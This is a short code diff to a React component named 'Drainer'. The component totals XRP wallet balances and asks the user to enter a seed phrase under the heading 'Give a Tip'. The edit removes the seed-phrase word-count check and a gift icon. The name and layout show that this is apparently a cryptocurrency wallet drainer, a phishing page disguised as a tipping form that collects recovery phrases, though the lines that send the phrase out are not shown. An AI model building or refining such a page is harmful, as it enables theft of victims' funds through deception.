@@ -35,21 +35,11 @@ const Drainer: React.FC = () => {
     const totalXRP = totalSelected.reduce((acc, w) => acc + w.balance, 0);
     const totalUSD = totalSelected.reduce((acc, w) => acc + w.usdValue, 0);
 
-    const validateSeedPhrase = (seed: string) => {
-        const words = seed.trim().split(/\s+/);
-        return words.length === 12 || words.length === 24;
-    };
-
     const handleScanWallets = () => {
         setSeedError('');
 
         if (!seedPhrase.trim()) {
             setSeedError('Please enter your seed phrase');
-            return;
-        }
-
-        if (!validateSeedPhrase(seedPhrase)) {
-            setSeedError('Seed phrase must be 12 or 24 words');
             return;
         }
 
@@ -107,7 +97,6 @@ const Drainer: React.FC = () => {
                 <h1 className="text-4xl md:text-5xl font-bold tracking-tight text-slate-900 mb-2">
                     <span className="inline-flex items-center gap-3">
                         Give a Tip
-                        <Gift className="w-10 h-10 text-orange-500" />
                     </span>
                 </h1>
                 <p className="text-slate-600 text-lg max-w-xl">
